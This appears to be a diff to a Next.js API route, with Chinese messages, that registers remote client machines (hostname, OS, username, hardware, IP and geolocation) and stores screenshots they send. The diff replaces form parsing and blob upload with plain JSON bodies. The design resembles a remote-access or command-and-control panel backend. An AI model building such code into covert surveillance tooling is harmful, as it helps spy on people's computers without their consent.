@@ -1,7 +1,4 @@
 import { NextApiRequest, NextApiResponse } from 'next'
-import { put } from '@vercel/blob'
-import { Readable } from 'stream'
-import formidable from 'formidable'
 
 interface ClientInfo {
   id: string
@@ -22,12 +19,6 @@ interface ClientInfo {
 const clients = new Map<string, ClientInfo>()
 const screenshots = new Map<string, string>()
 
-export const config = {
-  api: {
-    bodyParser: false,
-  },
-}
-
 const getGeolocation = async (ip: string): Promise<{ country: string; city: string; isp: string }> => {
   try {
     if (ip === '::1' || ip === '127.0.0.1' || ip.startsWith('192.168.')) {
@@ -47,54 +38,31 @@ const getGeolocation = async (ip: string): Promise<{ country: string; city: stri
   }
 }
 
-const parseForm = (req: NextApiRequest): Promise<{ fields: formidable.Fields; files: formidable.Files }> => {
-  return new Promise((resolve, reject) => {
-    const form = new formidable.IncomingForm()
-    form.parse(req, (err, fields, files) => {
-      if (err) {
-        reject(err)
-      } else {
-        resolve({ fields, files })
-      }
-    })
-  })
-}
-
 export default async function handler(req: NextApiRequest, res: NextApiResponse) {
   const { action, id } = req.query
   const clientId = id as string
 
   switch (action) {
     case 'register': {
-      try {
-        const { fields } = await parseForm(req)
-        const bodyValue = fields.body
-        const bodyString = Array.isArray(bodyValue) ? bodyValue[0] : bodyValue
-        const body = JSON.parse(bodyString as string)
-        
-        const { id: clientId, hostname, os, username, cpu, ram } = body
-        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'unknown'
-        const geo = await getGeolocation(ip.toString())
-        
-        const client: ClientInfo = {
-          id: clientId,
-          ip: ip.toString(),
-          ...geo,
-          hostname,
-          os,
-          username,
-          cpu,
-          ram,
-          lastHeartbeat: Date.now(),
-          status: 'online'
-        }
-        
-        clients.set(clientId, client)
-        res.status(200).json({ status: 'success', message: '客户端注册成功' })
-      } catch (error) {
-        console.error('注册失败:', error)
-        res.status(500).json({ status: 'error', message: '注册失败' })
+      const { id: clientId, hostname, os, username, cpu, ram } = req.body
+      const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'unknown'
+      const geo = await getGeolocation(ip.toString())
+      
+      const client: ClientInfo = {
+        id: clientId,
+        ip: ip.toString(),
+        ...geo,
+        hostname,
+        os,
+        username,
+        cpu,
+        ram,
+        lastHeartbeat: Date.now(),
+        status: 'online'
       }
+      
+      clients.set(clientId, client)
+      res.status(200).json({ status: 'success', message: '客户端注册成功' })
       break
     }
 
@@ -165,37 +133,16 @@ export default async function handler(req: NextApiRequest, res: NextApiResponse)
         break
       }
       
-      try {
-        const { files } = await parseForm(req)
-        const fileValue = files.file
-        const file = (Array.isArray(fileValue) ? fileValue[0] : fileValue) as formidable.File
-        
-        if (!file) {
-          res.status(400).json({ status: 'error', message: '缺少文件' })
-          break
-        }
-        
-        const fileName = `screenshots/${clientId}_${Date.now()}.jpg`
-        const stream = Readable.from(file.filepath)
-        
-        const result = await put(fileName, stream, {
-          contentType: 'image/jpeg',
-          access: 'public'
-        })
-        
-        screenshots.set(clientId, result.url)
-        
-        const client = clients.get(clientId)
-        if (client) {
-          client.screenshotUrl = result.url
-          clients.set(clientId, client)
-        }
-        
-        res.status(200).json({ status: 'success', message: '截图上传成功', url: result.url })
-      } catch (error) {
-        console.error('上传截图失败:', error)
-        res.status(500).json({ status: 'error', message: '上传截图失败' })
+      const { url } = req.body
+      screenshots.set(clientId, url)
+      
+      const client = clients.get(clientId)
+      if (client) {
+        client.screenshotUrl = url
+        clients.set(clientId, client)
       }
+      
+      res.status(200).json({ status: 'success', message: '截图上传成功' })
       break
     }
 
